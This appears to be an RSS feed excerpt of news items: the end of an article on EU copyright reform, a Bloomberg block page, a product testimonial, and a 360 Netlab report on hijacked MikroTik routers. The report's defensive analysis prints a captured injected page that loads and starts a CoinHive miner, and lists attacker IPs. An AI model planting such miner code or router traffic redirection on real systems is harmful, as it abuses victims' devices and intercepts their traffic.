&lt;p&gt;The EC’s VP and commissioner for the digital single market, Andrus Ansip, has described the scale of lobbying from “all sides” around the copyright reform proposals as “&lt;a href=&quot;https://ec.europa.eu/commission/commissioners/2014-2019/ansip/blog/crunch-time-copyright-europe-needs-find-best-way-forward_en&quot;&gt;astonishing&lt;/a&gt;“.&lt;/p&gt;
&lt;p&gt;“Everyone claims that their rivals will kill creativity, or kill innovation, or kill the internet — or kill all of it at the same time. This all has to stop. It is getting us nowhere,” he wrote in a blog post in late July. “It is good to have a lively debate about copyright – but not one which has descended into slogans and exaggeration.&lt;/p&gt;
&lt;p&gt;“We need to go beyond that, to find an acceptable and workable compromise that gives Europeans the right kind of copyright laws for the digital age. They deserve nothing less. And it &lt;u&gt;is&lt;/u&gt; achievable.”&lt;/p&gt;
&lt;p&gt;“Today, the debate sounds as if we had to choose between protecting artists or the internet,” he added. “I do not agree with this. What we should be doing — together — is to protect both: to make sure artists are paid fairly for their work, and at the same time protect freedom of expression and creativity on the internet. So we should not accept anything that puts that freedom in danger.&lt;/p&gt;
&lt;p&gt;“Neither should we accept leaving artists and quality media unprotected. Those were my starting points for the Commission’s proposal. They have not changed.”&lt;/p&gt;
&lt;p&gt;Ansip also wrote that he would like to see the parliament move closer to the Commission’s original proposals in its September vote, writing: “I genuinely believe that it was a good proposal, taking all opposing interests into account. That was not easy to achieve in itself.”&lt;/p&gt;
&lt;p&gt;How or even whether MEPs manage to compromise on such a contentious issue remains to be seen. And in the meanwhile the lobbying isn’t letting up.&lt;/p&gt;
&lt;p&gt;Pirate Party MEP Julia Reda has been &lt;a href=&quot;https://techcrunch.com/2017/04/15/a-conversation-about-digital-copyright-reform/&quot;&gt;campaigning for a copyright reform fit for the digital age&lt;/a&gt; for her entire career as an elected member of the European parliament.&lt;/p&gt;
&lt;p&gt;Instead, she finds herself fighting against the threat of “censorship machines” and “link taxes”, as she sees it.&lt;/p&gt;
&lt;p&gt;“The proposals for a “compromise” currently circulating in the EP don’t go nearly far enough to address the concerns that Article 11 will harm hyperlinking and Article 13 will lead to the widespread installation of upload filters which will massively overblock legal posts,” she tells us. “In fact, they may make matters worse.”&lt;/p&gt;
&lt;p&gt;“The latest compromise proposal on the “link tax” now specifies that reproducing “individual words” from an article as part of a link is okay – but that just confirms that reproducing the full title of an article in a link, as is commonplace on the web, would require a license. It would be left to lengthy and expensive court cases to define how many words still count as “individual words” – links, the basic building block of the internet, would be mired in legal uncertainty for years.&lt;/p&gt;
&lt;p&gt;“The proposal on platform liability was simplified by removing mentions of specifically which measures should be deployed to prevent copyrighted content from appearing online, but along with that, also all safeguards, complaint mechanisms and the objective not to remove legal works. Even if the text no longer mentions upload filters per se, total liability for all user-uploaded content leaves platforms with no other choice but to filter uploads as best they can, erring on the side of caution. This is, at best, a cosmetic change.”&lt;/p&gt;
&lt;p&gt;Reda will be filing her own counter-proposals — aimed at removing “the threats to freedom of speech and the basic functioning of the internet”, as she couches it — from the text.&lt;/p&gt;
&lt;p&gt;The deadline for amendments is Wednesday night so there is still time for proposals to shift. After that it will be up to MEPs to decide how they vote.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;This report was updated with additional comment&lt;/em&gt;&lt;/p&gt;
</description>
<pubDate>Tue, 04 Sep 2018 16:13:33 +0000</pubDate>
<dc:creator>AnatMl2</dc:creator>
<og:title>Wikimedia warns EU copyright reform threatens the ‘vibrant free web’</og:title>
<og:description>The Wikimedia Foundation has sounded a stark warning against a copyright reform proposal in Europe that’s due to be voted on by the European Parliament next week. (With the mild irony that it’s done so with a blog post on the commercial Medium platform.) In the post, also emailed to Tec…</og:description>
<og:image>https://techcrunch.com/wp-content/uploads/2015/02/copyrightfire-e1424465831225.jpg?w=561</og:image>
<og:url>http://social.techcrunch.com/2018/09/04/wikimedia-warns-eu-copyright-reform-threatens-the-vibrant-free-web/</og:url>
<og:type>article</og:type>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://techcrunch.com/2018/09/04/wikimedia-warns-eu-copyright-reform-threatens-the-vibrant-free-web/</dc:identifier>
</item>
<item>
<title>Mercedes Readies First Tesla Rival in $12B Attack</title>
<link>https://www.bloomberg.com/news/articles/2018-09-04/mercedes-readies-first-tesla-rival-in-12-billion-attack-plan</link>
<guid isPermaLink="true" >https://www.bloomberg.com/news/articles/2018-09-04/mercedes-readies-first-tesla-rival-in-12-billion-attack-plan</guid>
<description>&lt;head&gt;&lt;title&gt;Terms of Service Violation&lt;/title&gt;&lt;/head&gt;&lt;body id=&quot;readabilityBody&quot; readability=&quot;24&quot;&gt;
&lt;div class=&quot;container&quot; readability=&quot;9.4285714285714&quot;&gt;&lt;img src=&quot;https://www.bloomberg.com/graphics/assets/img/BB-Logo-2line.svg&quot; width=&quot;310&quot;/&gt;
&lt;p&gt;Your usage has been flagged as a violation of our &lt;a href=&quot;http://www.bloomberg.com/tos&quot; target=&quot;_blank&quot; rel=&quot;noopener noreferrer&quot;&gt;terms of service&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For inquiries related to this message please &lt;a href=&quot;http://www.bloomberg.com/feedback&quot;&gt;contact support&lt;/a&gt;. For sales inquiries, please visit &lt;a href=&quot;http://www.bloomberg.com/professional/request-demo&quot;&gt;http://www.bloomberg.com/professional/request-demo&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;If you believe this to be in error, please confirm below that you are not a robot by clicking &quot;I'm not a robot&quot; below.&lt;/h3&gt;
&lt;br/&gt;&lt;h3&gt;Please make sure your browser supports JavaScript and cookies and that you are not blocking them from loading. For more information you can review the Terms of Service and Cookie Policy.&lt;/h3&gt;
&lt;br/&gt;&lt;h3 id=&quot;block_uuid&quot;&gt;Block reference ID:&lt;/h3&gt;
&lt;/div&gt;
&lt;/body&gt;</description>
<pubDate>Tue, 04 Sep 2018 16:02:20 +0000</pubDate>
<dc:creator>antr</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.bloomberg.com/tosv2.html?vid=&amp;uuid=e4636710-b0e1-11e8-89e8-51708e700515&amp;url=L25ld3MvYXJ0aWNsZXMvMjAxOC0wOS0wNC9tZXJjZWRlcy1yZWFkaWVzLWZpcnN0LXRlc2xhLXJpdmFsLWluLTEyLWJpbGxpb24tYXR0YWNrLXBsYW4=</dc:identifier>
</item>
<item>
<title>Show HN: Magic Sandbox – learn Kubernetes on real infrastructure</title>
<link>https://magicsandbox.com</link>
<guid isPermaLink="true" >https://magicsandbox.com</guid>
<description>&lt;p&gt;Oscar Nunez&lt;/p&gt;
&lt;p&gt;Engineer at Cyber Solutions Provider&lt;/p&gt;
&lt;p class=&quot;testimonial-text&quot;&gt;Personally I have been studying k8s for a while on all sorts of platforms (Udemy, LinuxAcademy, Katacoda, Books...). But your visualization really clicks things for me... It is not as dry as just typing in code and getting text as feedback... I have never actually seen what my commands do so visually...&lt;/p&gt;
&lt;img src=&quot;https://uploads-ssl.webflow.com/5b838324947a56544907516b/5b899f7b4de076fe6c9a0407_0-3.jpg&quot; width=&quot;59&quot; class=&quot;image&quot;/&gt;</description>
<pubDate>Tue, 04 Sep 2018 15:15:31 +0000</pubDate>
<dc:creator>mstipetic</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.magicsandbox.com/</dc:identifier>
</item>
<item>
<title>MikroTik routers are forwarding owners’ traffic to unknown attackers</title>
<link>https://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours-en/</link>
<guid isPermaLink="true" >https://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours-en/</guid>
<description>&lt;p&gt;[Update]&lt;/p&gt;&lt;p&gt;2018-09-05 11:00 GMT+8, with the generous help from the AS64073, 103.193.137.211 has been promptly suspended and is no longer a threat.&lt;/p&gt;
&lt;h4 id=&quot;overview&quot;&gt;Overview&lt;/h4&gt;
&lt;p&gt;MikroTik is a Latvian company founded in 1996 to develop routers and wireless ISP systems. MikroTik now provides hardware and software for Internet connectivity in countries around the world. In 1997, MikroTik created the RouterOS software system. In 2002, MikroTik decided to build its own hardware and created the RouterBOARD brand. Each RouterBOARD device runs the RouterOS software system.&lt;a href=&quot;https://mikrotik.com/aboutus&quot;&gt;[1]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;According to WikiLeaks, the CIA Vault7 hacking tool Chimay Red involves 2 exploits, including Winbox Any Directory File Read (CVE-2018-14847) and Webfig Remote Code Execution Vulnerability.&lt;a href=&quot;https://wikileaks.org/ciav7p1/cms/page_16384604.html&quot;&gt;[2]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Both Winbox and Webfig are RouterOS management components, while Winbox is a Windows GUI application and the Webfig is web based. Their corresponding communion ports are TCP/8291, TCP/80, and TCP/8080. &lt;a href=&quot;https://wiki.mikrotik.com/wiki/Manual:Winbox&quot;&gt;[3]&lt;/a&gt; &lt;a href=&quot;https://wiki.mikrotik.com/wiki/Manual:Webfig&quot;&gt;[4]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Since Mid-July, our Anglerfish Honeypot System has been picking up malware exploiting the above MikroTik CVE-2018-14847 vulnerability to perform various malicious activities. Some of the activity has been spotted by other security researchers such as CoinHive mining code injecting.&lt;a href=&quot;https://www.cert.hr/NCBotMikroTik&quot;&gt;[5]&lt;/a&gt;&lt;a href=&quot;https://www.trustwave.com/Resources/SpiderLabs-Blog/Mass-MikroTik-Router-Infection-%E2%80%93-First-we-cryptojack-Brazil,-then-we-take-the-World-/&quot;&gt;[6]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;What’s more, we have observed massive number of victims having their Socks4 proxy enabled on the device by one single malicious actor.&lt;/p&gt;
&lt;p&gt;More interestingly, we also discovered that more than 7,500+ victims are being actively eavesdropped, with their traffic being forwarded to IPs controlled by unknown attackers.&lt;/p&gt;
&lt;p&gt;From 2018-08-09, we have made multiple rounds of measurements to calculate the scale of the CVE-2018-14847 vulnerability and exploitability on the Internet. We strictly followed the Winbox communication protocol to make sure those devices are indeed MikroTik routers, and to verify if the device has been hacked and what the hacked box is being up to. We understand the user devices come and go on the internet all the time, so the data used in this blog reflects what we saw between 2018-08-23~2018-08-24.&lt;/p&gt;
&lt;h4 id=&quot;vulnerabledevices&quot;&gt;Vulnerable Devices&lt;/h4&gt;
&lt;p&gt;From our own scan result, we logged more than 5,000K devices with open TCP/8291 port, and 1,200k of them were identified as Mikrotik devices, within which 370k (30.83%) are CVE-2018-14847 vulnerable. See this map for the countries distribution of vulnerable IPs.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.netlab.360.com/content/images/2018/09/11-1.png&quot; alt=&quot;MikroTik RouterOS CVE-2018-14847 Distribution&quot; title=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;The following is a Top 20 nations list (device count, country).&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;42376 Brazil/BR  
40742 Russia/RU  
22441 Indonesia/ID  
21837 India/IN  
19331 Iran/IR  
16543 Italy/IT  
14357 Poland/PL  
14007 United States/US  
12898 Thailand/TH  
12720 Ukraine/UA  
11124 China/CN  
10842 Spain/ES  
 8758 South Africa/ZA
 8621 Czech/CZ
 6869 Argentina/AR
 6474 Colombia/CO
 6134 Cambodia/KH
 5512 Bangladesh/BD
 4857 Ecuador/EC
 4162 Hungary/HU
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;theattacks&quot;&gt;The Attacks&lt;/h4&gt;
&lt;h6 id=&quot;coinhiveminingcodeinjection&quot;&gt;CoinHive Mining Code Injection&lt;/h6&gt;
&lt;p&gt;After enabling the Mikrotik RouterOS HTTP proxy, the attacker uses a trick in the configuration by redirecting all the HTTP proxy requests to a local HTTP 403 error page, and in this error page a link for web mining code from coinhive.com is inserted. By doing this, the attacker hopes to perform web mining for all the proxy traffic on the users’ devices&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.netlab.360.com/content/images/2018/09/4-5.png&quot; alt=&quot;web-proxy&quot; title=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;What is disappointing for the attacker though, the mining code does not work in this way, because all the external web resources, including those from coinhive.com necessary for web mining, are blocked by the proxy ACLs set by attackers themselves.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;# curl -i --proxy http://192.168.40.147:8080 http://netlab.360.com
HTTP/1.0 403 Forbidden  
Content-Length: 418  
Content-Type: text/html  
Date: Sat, 26 Aug 2017 03:53:43 GMT  
Expires: Sat, 26 Aug 2017 03:53:43 GMT  
Server: Mikrotik HttpProxy  
Proxy-Connection: close

&amp;lt;html&amp;gt;  
&amp;lt;head&amp;gt;  
   &amp;lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=windows-1251&quot;&amp;gt;
   &amp;lt;title&amp;gt;&quot;http://netlab.360.com/&quot;&amp;lt;/title&amp;gt;
&amp;lt;script src=&quot;https://coinhive.com/lib/coinhive.min.js&quot;&amp;gt;&amp;lt;/script&amp;gt;  
&amp;lt;script&amp;gt;  
   var miner = new CoinHive.Anonymous('hsFAjjijTyibpVjCmfJzlfWH3hFqWVT3', {throttle: 0.2});
   miner.start();
&amp;lt;/script&amp;gt;  
&amp;lt;/head&amp;gt;  
&amp;lt;frameset&amp;gt;  
&amp;lt;frame src=&quot;http://netlab.360.com/&quot;&amp;gt;&amp;lt;/frame&amp;gt;  
&amp;lt;/frameset&amp;gt;  
&amp;lt;/html&amp;gt;  
&lt;/code&gt;
&lt;/pre&gt;
&lt;h6 id=&quot;sock4proxyandthemysterious9515421612825&quot;&gt;Sock4 Proxy and the Mysterious 95.154.216.128/25&lt;/h6&gt;
&lt;p&gt;At present, a total of 239K IPs are confirmed to have Socks4 proxy enabled maliciously. The Socks4 port is mostly TCP/4153, and very interestingly, the Socks4 proxy config only allows access from one single net-block 95.154.216.128/25. In order for the attacker to gain control even after device reboot(ip change), the device is configured to run a scheduled task to periodically report its latest IP address by accessing a specific attacker's URL.&lt;/p&gt;
&lt;p&gt;The attacker also continues to scan more MikroTik RouterOS devices by using these compromised Socks4 proxy.&lt;/p&gt;
&lt;p&gt;At this point, all the 239K IPs only allow access from 95.154.216.128/25, actually mainly 95.154.216.167. It is hard to say what the attacker is up to with these many Sock4 proxies but we think this is something significant.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.netlab.360.com/content/images/2018/09/5.png&quot; alt=&quot;script&quot; title=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h6 id=&quot;eavesdropping&quot;&gt;Eavesdropping&lt;/h6&gt;
&lt;p&gt;The MikroTik RouterOS device allows users to capture packets on the router and forward the captured network traffic to the specified Stream server.[&lt;a href=&quot;https://wiki.mikrotik.com/wiki/Manual:Tools/Packet_Sniffer&quot;&gt;7]&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;At present, a total of 7.5k MikroTik RouterOS device IPs have been compromised by the attacker and their TZSP traffic is being forwarded to some collecting IP addresses.&lt;/p&gt;
&lt;p&gt;37.1.207.114 is the top player among all the attackers. A significant number of devices have their traffic going to this destination.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://blog.netlab.360.com/content/images/2018/09/6.png&quot; alt=&quot;packet-sniffer&quot; title=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Attackers mainly interested in port 20, 21, 25, 110, and 143, corresponding to FTP-data, FTP, SMTP, POP3, and IMAP traffic. We also noticed the snmp port 161 and 162 are also top on the list. This deserve some questions, why the attacker is paying attention to the network management protocol regular users barely use? Are they trying to monitor and capture some special users’ network snmp community strings? We don’t have an answer at this point, but we would be very interested to know what the answer might be.&lt;/p&gt;
&lt;p&gt;The following is a list of Top attackers&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;5164 37.1.207.114  
1347 185.69.155.23  
1155 188.127.251.61  
 420 5.9.183.69
 123 77.222.54.45
 123 103.193.137.211
  79 24.255.37.1
  26 45.76.88.43
  16 206.255.37.1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;The following is a list of port being eavesdropped&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;5837 21  
5832 143  
5784 110  
4165 20  
2850 25  
1328 23  
1118 1500  
1095 8083  
 993 3333
 984 50001
 982 8545
 677 161
 673 162
 355 3306
 282 80
 243 8080
 237 8081
 230 8082
 168 53
 167 2048    
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Victims breakdown, Russia is the most affected. We are not comfortable to share the IPs to the public, but relevant security entities in affected countries are welcomed to contact us for full IP list they represent.&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;1628 Russia/RU  
 637 Iran/IR
 615 Brazil/BR
 594 India/IN
 544 Ukraine/UA
 375 Bangladesh/BD
 364 Indonesia/ID
 218 Ecuador/EC
 191 United States/US
 189 Argentina/AR
 122 Colombia/CO
 113 Poland/PL
 106 Kenya/KE
 100 Iraq/IQ
  92 Austria/AT
  92 Asia-Pacific Region/
  85 Bulgaria/BG
  84 Spain/ES
  69 Italy/IT
  63 South Africa/ZA
  62 Czech/CZ
  59 Serbia/RS
  56 Germany/DE
  52 Albania/AL
  50 Nigeria/NG
  47 China/CN
  39 Netherlands/NL
  38 Turkey/TR
  37 Cambodia/KH
  32 Pakistan/PK
  30 United Kingdom/GB
  29 European Union
  26 Latin America
  25 Chile/CL
  24 Mexico/MX
  22 Hungary/HU
  20 Nicaragua/NI
  19 Romania/RO
  18 Thailand/TH
  16 Paraguay/PY
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;suggestions&quot;&gt;Suggestions&lt;/h4&gt;
&lt;p&gt;We recommend that MikroTik RouterOS users update the software system in a timely manner, and check whether the http proxy, Socks4 proxy and network traffic capture function are being maliciously exploited by attackers.&lt;/p&gt;
&lt;p&gt;We recommend that MikroTik denies inbound access to the Webfig and Winbox ports from the Internet and improve the software security update mechanism.&lt;/p&gt;
&lt;p&gt;Relevant security agency are welcomed to contact netlab[at]360.cn for a full list of infected IP addresses.&lt;/p&gt;
&lt;h4 id=&quot;contactus&quot;&gt;Contact Us&lt;/h4&gt;
&lt;p&gt;Readers can feel free to contact us on our &lt;a href=&quot;https://twitter.com/360Netlab&quot;&gt;&lt;strong&gt;twitter&lt;/strong&gt;&lt;/a&gt; or WeChat &lt;strong&gt;360Netlab&lt;/strong&gt; .&lt;/p&gt;
&lt;h4 id=&quot;ioc&quot;&gt;IoC&lt;/h4&gt;
&lt;p&gt;Attacker and collector IPs&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;37.1.207.114      AS50673 Serverius Holding B.V.  
185.69.155.23     AS200000 Hosting Ukraine LTD  
188.127.251.61    AS56694 Telecommunication Systems, LLC  
5.9.183.69        AS24940 Hetzner Online GmbH  
77.222.54.45      AS44112 SpaceWeb Ltd  
[removed]         103.193.137.211   AS64073 Vetta Online Ltd 
24.255.37.1       AS22773 Cox Communications Inc.  
45.76.88.43       AS20473 Choopa, LLC  
206.255.37.1      AS53508 Cablelynx  
95.154.216.167    AS20860 iomart Cloud Services Limited.  
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;Used to be but no longer a threat&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;103.193.137.211   AS64073 Vetta Online Ltd (With the generous help from the AS64073 , 103.193.137.211 has been promptly suspended and is no longer a threat.)  
&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Tue, 04 Sep 2018 10:43:23 +0000</pubDate>
<dc:creator>DyslexicAtheist</dc:creator>
<og:type>article</og:type>
<og:title>7,500+ MikroTik Routers Are Forwarding Owners’ Traffic to the Attackers, How is Yours?</og:title>
<og:description>[Update] 2018-09-05 11:00 GMT+8, with the generous help from the AS64073, 103.193.137.211 has been promptly suspended and is no longer a threat. Overview MikroTik is a Latvian company founded in 1996 to develop routers and wireless ISP systems. MikroTik now provides hardware and software for</og:description>
<og:url>http://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours-en/</og:url>
<dc:format>text/html</dc:format>
<dc:identifier>https://blog.netlab.360.com/7500-mikrotik-routers-are-forwarding-owners-traffic-to-the-attackers-how-is-yours-en/</dc:identifier>
</item>
</channel>
</rss>